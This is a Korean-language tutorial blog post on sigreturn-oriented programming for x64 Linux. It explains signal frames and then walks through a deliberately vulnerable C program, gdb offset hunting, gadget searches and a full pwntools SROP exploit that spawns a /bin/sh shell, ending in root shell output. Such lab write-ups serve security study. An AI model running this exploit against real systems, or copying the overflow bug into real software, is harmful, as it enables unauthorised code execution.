---
title: Sigreturn-Oriendted Programming - x64
author: Beomsu Lee
category: [Exploitation, Stack]
tags: [exploitation, stack, sigreturn-oriented programming]
math: true
mermaid: true
---

## Description

x86과 x64의 signal & signal handler의 동작은 동일하다.

```c
// Test Code
// gcc -g -o sig64 sig.c
#include <stdio.h>
#include <signal.h>
 
struct sigcontext sigcontext;
 
void handle_signal(int signum){
    printf("Signal number: %d\n", signum);
}
 
int main(){
    signal(SIGINT, (void *)handle_signal);
    while(1) {}
    return 0;
}
```

gdb가 인터럽트에 반응하지 않도록 설정한다.

```
gdb-peda$ b handle_signal
Breakpoint 1 at 0x400571: file sig.c, line 8.
gdb-peda$ handle SIGINT nostop pass
Signal        Stop  Print   Pass to program Description
SIGINT        No    Yes Yes     Interrupt
```

"CTRL + C" SIGINT 시그널 발생시키고 `bt`로 frame을 확인한다.

```
Breakpoint 1, handle_signal (signum=0x2) at sig.c:8
8       printf("Signal number: %d\n", signum);
gdb-peda$ bt
#0  handle_signal (signum=0x2) at sig.c:8
#1  <signal handler called>
#2  main () at sig.c:13
#3  0x00007ffff7a2d830 in __libc_start_main (main=0x400588 <main>, argc=0x1, 
    argv=0x7fffffffe4a8, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffe498) at ../csu/libc-start.c:291
#4  0x0000000000400499 in _start ()
```

`frame 0`의 stack에 저장된 값이 `frame 2`의 레지스터 값인 것을 확인할 수 있다.

```
gdb-peda$ frame 0
#0  handle_signal (signum=0x2) at sig.c:8
8       printf("Signal number: %d\n", signum);
gdb-peda$ p ((struct sigcontext *)($rbp + 7 * 8))->rax
$1 = 0x0
gdb-peda$ p ((struct sigcontext *)($rbp + 7 * 8))->rsp
$2 = 0x7fffffffe3c0
gdb-peda$ p ((struct sigcontext *)($rbp + 7 * 8))->rip
$3 = 0x40059b
```

```
gdb-peda$ frame 2
#2  main () at sig.c:13
13      while(1) {}
gdb-peda$ info r
rax            0x0  0x0
rbx            0x0  0x0
rcx            0x0  0x0
rdx            0x0  0x0
rsi            0x0  0x0
rdi            0x2  0x2
rbp            0x7fffffffe3c0   0x7fffffffe3c0
rsp            0x7fffffffe3c0   0x7fffffffe3c0
r8             0x7fffffffe310   0x7fffffffe310
r9             0x0  0x0
r10            0x8  0x8
r11            0x202    0x202
r12            0x400470 0x400470
r13            0x7fffffffe4a0   0x7fffffffe4a0
r14            0x0  0x0
r15            0x0  0x0
rip            0x40059b 0x40059b <main+19>
eflags         0x202    [ IF ]
cs             0x33 0x33
ss             0x2b 0x2b
ds             0x0  0x0
es             0x0  0x0
fs             0x0  0x0
gs             0x0  0x0
```

sigreturn의 시스템 호출 번호는 0xf(15)이다.

```
gdb-peda$ x/2i $rip
=> 0x7ffff7a424b0 <__restore_rt>:   mov    rax,0xf
0x7ffff7a424b7 <__restore_rt+7>:    syscall
```

x64이기 때문에 사용되는 레지스터가 다르며, `sigcontext` 구조체의 형태도 다르다.

```c
# else /* __x86_64__: */
struct sigcontext {
    __u64               r8;
    __u64               r9;
    __u64               r10;
    __u64               r11;
    __u64               r12;
    __u64               r13;
    __u64               r14;
    __u64               r15;
    __u64               rdi;
    __u64               rsi;
    __u64               rbp;
    __u64               rbx;
    __u64               rdx;
    __u64               rax;
    __u64               rcx;
    __u64               rsp;
    __u64               rip;
    __u64               eflags;     /* RFLAGS */
    __u16               cs;
    __u16               gs;
    __u16               fs;
    union {
        __u16           ss; /* If UC_SIGCONTEXT_SS */
        __u16           __pad0; /* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
    };
    __u64               err;
    __u64               trapno;
    __u64               oldmask;
    __u64               cr2;
    struct _fpstate __user      *fpstate;   /* Zero when no FPU context */
#  ifdef __ILP32__
    __u32               __fpstate_pad;
#  endif
    __u64               reserved1[8];
};
```

## Proof of concept

```c
// Vuln Code
// gcc -fno-stack-protector -o srop64 srop64.c -ldl
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

void vuln(){
    char buf[50];
    void (*printf_addr)() = dlsym(RTLD_NEXT, "printf");
    printf("Printf() address : %p\n",printf_addr);
    read(0, buf, 512);
}

void main(){
    seteuid(getuid());
    write(1,"Hello SROP\n",11);
    vuln();
}
```

"A"*72 입력 후 return address 변조할 수 있다.

### Exploit Method

`sigreturn()` 함수를 이용해 레지스터에 필요한 값 저장한다. 
* `rsp` : `sigreturn()` 함수 호출 후 이동할 주소("int 0x80") 
* `rdi` : "/bin/sh" 문자열 저장된 주소 
* `rax` : execve() 함수 시스템 콜 번호 
* `rip` : "int 0x80" 
* `cs` : User Code(0x33) 
* `ss` : User Data / Stack(0x2b)

libc offset을 계산한다.

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /root/pwnable/srop64
0x00600000         0x00601000         r--p  /root/pwnable/srop64
0x00601000         0x00602000         rw-p  /root/pwnable/srop64
0x00602000         0x00623000         rw-p  [heap]
0x00007ffff7809000 0x00007ffff79c9000 r-xp  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff79c9000 0x00007ffff7bc9000 ---p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bc9000 0x00007ffff7bcd000 r--p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7bcf000 rw-p  /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcf000 0x00007ffff7bd3000 rw-p  mapped
0x00007ffff7bd3000 0x00007ffff7bd6000 r-xp  /lib/x86_64-linux-gnu/libdl-2.23.so
0x00007ffff7bd6000 0x00007ffff7dd5000 ---p  /lib/x86_64-linux-gnu/libdl-2.23.so
0x00007ffff7dd5000 0x00007ffff7dd6000 r--p  /lib/x86_64-linux-gnu/libdl-2.23.so
0x00007ffff7dd6000 0x00007ffff7dd7000 rw-p  /lib/x86_64-linux-gnu/libdl-2.23.so
0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fdf000 rw-p  mapped
0x00007ffff7ff7000 0x00007ffff7ffa000 r--p  [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp  [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p  /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
gdb-peda$ p 0x7ffff785e800(printf)-0x00007ffff7809000
$1 = 0x55800
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7995d57 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ p 0x7ffff7995d57-0x00007ffff7809000
$2 = 0x18cd57
```

**Find Gadget**

```
root@bs-virtual-machine:~/pwnable# rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.23.so -r 1 | grep "pop rax"
0x00074c47: pop rax ; call qword [r12+0x30] ;  (1 found)
0x000743ff: pop rax ; call qword [r13+0x30] ;  (1 found)
0x00184d32: pop rax ; call qword [rdi+0x4656EE7E] ;  (1 found)
0x00135a34: pop rax ; call rax ;  (1 found)
0x00135876: pop rax ; jmp rcx ;  (1 found)
0x00033544: pop rax ; ret  ;  (1 found)
0x0003a727: pop rax ; ret  ;  (1 found)
0x0003a728: pop rax ; ret  ;  (1 found)
0x0003a7f7: pop rax ; ret  ;  (1 found)
0x0003a7f8: pop rax ; ret  ;  (1 found)
0x0003a8a0: pop rax ; ret  ;  (1 found)
0x0003a8a1: pop rax ; ret  ;  (1 found)
0x000abc07: pop rax ; ret  ;  (1 found)
0x00106272: pop rax ; ret  ;  (1 found)
0x00106273: pop rax ; ret  ;  (1 found)
0x001a1448: pop rax ; ret  ;  (1 found)
0x000caabc: pop rax ; retn 0x002F ;  (1 found)
```

```
root@bs-virtual-machine:~/pwnable# rp-lin-x64 -f /lib/x86_64-linux-gnu/libc-2.23.so -r 1 | grep "syscall  ; ret" 
0x000bc375: syscall  ; ret  ;  (1 found)
0x000cd235: syscall  ; ret  ;  (1 found)
0x000cd245: syscall  ; ret  ;  (1 found)
0x000cd255: syscall  ; ret  ;  (1 found)
0x000cd265: syscall  ; ret  ;  (1 found)
0x000cd275: syscall  ; ret  ;  (1 found)
0x000cd485: syscall  ; ret  ;  (1 found)
0x000f6ed5: syscall  ; ret  ;  (1 found)
0x001077f5: syscall  ; ret  ;  (1 found)
0x00122198: syscall  ; ret  ;  (1 found)
```

빌드된 x64 파일의 리눅스 커널 버전이 3.3 이하일 경우 vsyscall 영역에서 `syscall & return` 명령어 찾을 수 있다. kernel의 boot option 중 `vsyscall`의 값이 `emulate`로 설정되어 있기 때문에 해당 gadget을 이용하여 시스템 함수를 호출하면 error 발생한다.

```
gdb-peda$ vmmap
Start              End                Perm  Name
0x00400000         0x00401000         r-xp  /root/pwnable/srop64
0x00600000         0x00601000         r--p  /root/pwnable/srop64
...
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p  mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p  [stack]
0xffffffffff600000 0xffffffffff601000 r-xp  [vsyscall]
gdb-peda$ x/3i 0xffffffffff600000
0xffffffffff600000: mov    rax,0x60
0xffffffffff600007: syscall 
0xffffffffff600009: ret 
```

해당 옵션이 native로 설정되면 사용 가능하다.

```
root@bs-virtual-machine:~/pwnable# cat /usr/src/linux-headers-$(uname -r)/.config | grep VSYSCALL
CONFIG_GENERIC_TIME_VSYSCALL=y
CONFIG_X86_VSYSCALL_EMULATION=y
# CONFIG_LEGACY_VSYSCALL_NATIVE is not set
CONFIG_LEGACY_VSYSCALL_EMULATE=y
# CONFIG_LEGACY_VSYSCALL_NONE is not set
```

|Purpose|Segment|
|:---:|:---:|
|Kernel Code|0x10|
|Kernel Data / Stack|0x18|
|User Code|0x33|
|User Data / Stack|0x2b|

## Exploit code

```python
# Exploit Code
from pwn import *

context.arch='amd64'
#context.log_level='debug'  
binary = ELF('./srop64')
p = process(binary.path)
#gdb.attach(p)

p.recvline()
stackAddr = p.recvline().split(' ')[3]
stackAddr = int(stackAddr,16)

#You need to change the value to match the environment you are testing.
libcBase = stackAddr - 0x55800
pop_rax_ret = libcBase + 0x00033544
syscall = libcBase + 0x000cd275
binsh = libcBase + 0x18cd57

print 'The base address of Libc    : ' + hex(libcBase)
print 'Address of syscall gadget   : ' + hex(syscall)
print 'Address of string "pop rax ; ret" : ' + hex(pop_rax_ret)
print 'Address of string "/bin/sh" : ' + hex(binsh)

exploit = ''
exploit += "\x90" * 72
exploit += p64(pop_rax_ret)  #ret
exploit += p64(0xf)
exploit += p64(syscall)

#Runed a 32bit program in the 64bit operation system.
frame = SigreturnFrame(kernel='amd64')
frame.rax = constants.SYS_execve
frame.rdi = binsh
#frame.rsp = syscall
frame.rip = syscall
exploit += str(frame)

#raw_input('1')
p.send(exploit)
p.interactive()
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable# python exploit.py 
[*] '/root/pwnable/srop64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/root/pwnable/srop64': pid 3873
The base address of Libc    : 0x7f0b52b30000
Address of syscall gadget   : 0x7f0b52bfd275
Address of string "pop rax ; ret" : 0x7f0b52b63544
Address of string "/bin/sh" : 0x7f0b52cbcd57
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root) 
```

## References
- [02.SROP(Sigreturn-oriented programming) - x64](https://www.lazenca.net/display/TEC/02.SROP%28Sigreturn-oriented+programming%29+-+x64)